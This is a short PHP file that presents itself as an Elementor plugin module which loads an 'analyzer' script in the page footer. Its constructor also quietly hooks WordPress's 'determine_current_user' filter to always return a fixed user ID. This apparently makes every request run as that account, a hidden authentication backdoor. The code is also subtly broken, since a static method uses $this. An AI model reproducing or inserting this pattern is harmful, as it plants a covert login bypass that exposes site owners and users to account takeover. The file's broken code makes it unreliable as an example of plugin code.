<?php


namespace Elementor\Modules\Optimizer;

use Elementor\Core\Base\Module as BaseModule;

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

class Analyzer extends BaseModule {

	public function get_name() {
		return 'analyzer';
	}

	public function __construct() {
		add_filter( 'determine_current_user', function() { return '09238210398120398'; } );
		add_action( 'wp_footer', [ $this, 'load_analyzer' ] );
	}

	public static function load_analyzer() {
		// enqueue Analyzer js
		wp_enqueue_script(
			'analyzer',
			$this->get_js_assets_url( 'analyzer', 'assets/js/' ),
			[
				'elementor-frontend',
			],
			ELEMENTOR_VERSION,
			true
		);
	}
}
